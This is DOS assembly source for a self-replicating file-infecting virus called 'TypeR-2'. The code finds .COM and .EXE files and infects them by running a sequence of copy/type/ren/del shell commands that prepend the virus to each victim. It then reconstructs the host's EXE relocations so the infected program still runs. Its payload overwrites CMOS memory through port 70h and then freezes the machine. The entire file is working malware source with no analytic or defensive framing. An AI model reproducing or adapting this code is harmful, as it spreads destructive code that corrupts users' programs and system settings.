   ; TypeR-2 (c) by SMT/SMF
   ; exe,com ¯ à §¨â :(
   ; Tnx to Duke for help

   .model tiny
   .code
   .386c
           org 100h
   Start:
           mov bx,2000h
           mov ah,4ah
           int 21h                 ; set size of this program segment to 128K
           mov eax,'moc.'          ; infect .com - files
           call Infect
           mov eax,'exe.'          ; infect .exe - files
           call Infect

       xor ax,ax
           mov ds,ax
           test byte ptr ds:[046ch],01fh
           push cs
           pop ds
           jnz short loader
           mov si,100h
           xor ax,ax
   save:   out 70h,ax
   lp1:    loop lp1
       outsb
   lp2:    loop lp2
       inc ax
           test al,80h
           jz save
       cli         ; Halting DOS or Win95
   m1: jmp m1

   loader: mov si,offset Victim
           cmp word ptr [si],'ZM'
           jnz runcom          ; It is a com file - there is no any
                                   ; relocations :(

   exeload:mov ax,si
       mov cl,4
       shr ax,cl
       mov bx,ds
       add ax,bx
       add ax,[si+8]       ; now ax=start of exe code
       mov [si],ax     ; store this value
       mov ax,cs
       add ax,10h
       mov bp,ax
       mov bx,si
       add bx,[si+18h]     ; bx = start of relocations
       mov cx,[si+6]       ; cx = amount of relocations
       jcxz short norel
   rels:   mov dx,[bx+2]
       add dx,[si]
       mov es,dx
       mov di,[bx]
       add es:[di],ax      ; settings up exe relocation items
       add bx,4
       loop rels

   norel:  push si
       mov si,offset Jumper
       push cs
       pop es
       mov di,0edh
       mov cx,13h
       cld
       rep movsb       ; preparing a startup code
       pop si
       mov ax,bp
       add ax,[si+16h]
       push ax
       mov ax,[si+14h]
       push ax
       push cs
       push ds
       mov ax,bp
       mov es,ax
       xor di,di
       add ax,[si+0Eh]
       push ax
       mov ax,[si+10h]
       push ax
       mov bx,[si+4]
       mov ax,[si+8]
       mov cl,5
       shr ax,cl
       sub bx,ax
       mov cl,8
       shl bx,cl
       mov cx,bx
       mov ax,[si]
       mov ds,ax
       xor si,si
       mov bx,0edh
       jmp bx
   Jumper: rep movsw
       pop ax bx es ds cx dx
           mov ss,bx
           mov sp,ax
           push dx cx
           xor bx,bx
           retf

   runcom:                 ; .com - loader
       xchg bp,si
       mov di,0f0h
           mov ax,100h
           push ax
           push di
           mov si,offset comldr
           mov cx,8
           rep movsw
           mov di,ax
           xor ax,ax
           xor bx,bx
           mov cx,0f000h
           xchg si,bp
           ret

   comldr: rep movsb
           xor di,di
       retn


   ;==========================================================
   ; exec - execute DOS command
   ; in: cs:si=command line

   ; 1.Searching for COMSPEC

   exec:   mov ax,cs:[2ch]         ; Get Dos environment segment
           mov ds,ax
           xor di,di
   l0: cmp word ptr ds:[di],'OC'
       jnz short noCOM
           cmp word ptr ds:[di+2],'SM'
           jnz short noCOM
           cmp word ptr ds:[di+4],'EP'
           jz short COM
   noCOM:  inc di
           jmp short l0
   COM:    add di,8
       push di                 ; di = pointer to %comspec% value

   ; 2. Preparing command line

       mov dword ptr cs:[cmdline+1],' C/ '
       mov di,offset cmdline+5
   exel1:  mov al,cs:[si]
       inc si
       cmp al,'%'          ; expand % to "%0" - full name of runned file
       jnz short noexpand
           push si
           xor si,si
   lll1:   inc si
           cmp word ptr ds:[si],0
           jnz short lll1
           add si,4               ; now ds:si points to this
                                  ; program path\filename
   lll2:   lodsb
       mov cs:[di],al
           inc di
           or al,al
           jnz short lll2
           pop si
   nxt:    dec di
       jmp short exel1
   noexpand:
       cmp al,'^'         ; expand ^ to found program name to infect
       jnz short noname
       mov bx,offset fname    ; CS:BX=pointer to infecting file name
   nm1:    mov al,cs:[bx]
       inc bx
           mov cs:[di],al
       inc di
           or al,al
           jnz short nm1
       jmp short nxt
   noname: mov cs:[di],al
           inc di
       cmp al,13
           jnz short exel1
       sub di,offset cmdline
           mov ax,di
           mov byte ptr cs:[cmdline],al

   ; 3. Executing a command
           push cs
       mov ax,cs
       pop es dx           ; dx = pointer to %comspec% value
           push si
           mov cs:[cmdseg],ax
           mov word ptr cs:[ss_save], ss
           mov word ptr cs:[sp_save], sp
           mov bx,offset EPB
           mov ax,4b00h
           int 21h         ; execute command.com /c ...commands...
           mov ax,1234h
   ss_save equ $-2
           mov ss,ax
           mov sp,1234h
   sp_save equ $-2
       pop si
           ret


   ;===============================================
   Infect: push cs
           pop ds
       mov dword ptr ds:[cmdline+1],eax ; place file mask to command line
       mov byte ptr ds:[cmdline],'*'

       mov dx,offset DTA
       mov ah,19h
       inc ah
       int 21h             ; set DTA to another place to prevent
                       ; destroying of original command line
       mov ah,4eh
       mov cx,7
           mov byte ptr ds:[cmdline+5],ch
   next:   mov dx,offset cmdline
           int 21h         ; Find first/next file int
           jc short quit       ; If none found then quit

   ; Save victim name:
           mov bx,offset DTA+1
           cmp dword ptr ds:[bx+19h],endv-virlen-100h
           jae short Skip          ; file too big
       lea si,bx[1dh]      ; ES:SI=pointer to infecting file
           push cs
           pop es
           mov di,offset fname
           mov cx,8
           rep movsw

   ; Infect routine:
       mov si,offset cmd0
   again:  call exec
           test byte ptr cs:[si],0ffh
           jnz short again

   Skip:   mov ah,4fh      ; Find next file
           jmp short next      ; Jump to the loop

   quit:
           ret

   ; Symbol ^ means victim name
   ; Symbol % means running virus file name
   cmd0    db 'copy ^ #$ >nul',13
       db 'type % >$#',13
       db 'copy/y/a $# $$ >nul',13
       db 'copy/y/b $$ + #$ ^ >nul',13
       db 'ren ^ *.com >nul',13
       db 'del $# >nul',13
       db 'del #$ >nul',13
       db 'del $$ >nul',13,0


   cmdline:
           db 80 dup (0)

   ; =============== EPB =================
   EPB     dw 0                    ; exec parameters block
   cmdofs  dw offset cmdline
   cmdseg  dw 0
   fcbs    dd 0,0
   ;---------------------------------------
       org ((($-Start+100h-1)/16)+1)*16-1    ; 16-byte align for exe-loader
       db 1ah  ; EOF !!!
   virlen  equ $-Start
   Victim: retn                ; example of a victim

   endv    equ 0f800h
       org endv
   fname   db 16 dup (?)
   DTA db 32 dup (?)
       end Start


